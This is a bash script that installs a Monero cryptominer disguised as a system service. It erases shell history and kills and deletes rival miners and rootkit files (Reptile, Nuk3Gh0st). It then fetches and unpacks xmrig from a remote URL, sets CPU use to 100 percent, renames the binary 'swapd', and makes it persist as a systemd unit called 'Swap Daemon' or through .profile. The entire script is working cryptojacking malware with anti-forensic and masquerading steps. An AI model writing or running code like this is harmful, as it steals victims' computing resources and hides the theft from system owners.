#!/bin/bash
unset HISTFILE
export HISTFILE=/dev/null

# Service cleanup
clean_services() {
    for service in gdm2 swapd; do
        systemctl stop "$service" &>/dev/null
        systemctl disable "$service" &>/dev/null
    done
}

# Process cleanup
kill_processes() {
    pkill -9 -f "swapd|kswapd0"
}

# Filesystem cleanup
clean_files() {
    local dirs=(
        .swapd .gdm .gdm2_manual .gdm2_manual_\* 
        /etc/systemd/system/{swapd,gdm2}.service
        /tmp/.ICE-unix/.X11-unix/{Reptile,Nuk3Gh0st}
    )
    
    for dir in "${dirs[@]}"; do
        chattr -R -i "$dir" 2>/dev/null
        rm -rf "$dir"
    done
}

clean_services
kill_processes
clean_files

# Main installation
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y curl

WALLET=${1:?"Wallet address required"}
VERSION=2.11

echo "MoneroOcean setup script v$VERSION"

# System preparation
export HOME=${HOME:-$(getent passwd "$(whoami)" | cut -d: -f6)}
[[ -d "$HOME" ]] || { echo "Invalid HOME directory"; exit 1; }

# Service setup
setup_service() {
    local wallet=$1
    local config="$HOME/.swapd/config.json"
    
    mkdir -p "$HOME/.swapd"
    curl -sSL "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" | tar xz -C "$HOME/.swapd"
    
    sed -i "s#\"user\":.*#\"user\": \"$wallet\",#" "$config"
    sed -i 's/"max-cpu-usage":.*/"max-cpu-usage": 100,/' "$config"
    sed -i 's/"donate-level":.*/"donate-level": 0,/' "$config"
    
    mv "$HOME/.swapd/xmrig" "$HOME/.swapd/swapd"
    chmod +x "$HOME/.swapd/swapd"
}

setup_service "$WALLET"

# Systemd service creation
if systemd=$(command -v systemctl); then
    cat > /etc/systemd/system/swapd.service <<EOF
[Unit]
Description=Swap Daemon
After=network.target

[Service]
ExecStart=$HOME/.swapd/swapd --config=$HOME/.swapd/config.json
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

    $systemctl daemon-reload
    $systemctl enable swapd
    $systemctl start swapd
else
    echo "[!] Systemd not found, using profile autostart"
    echo "$HOME/.swapd/swapd --config=$HOME/.swapd/config.json >/dev/null 2>&1" >> "$HOME/.profile"
fi

# Post-install
echo "Installation complete"
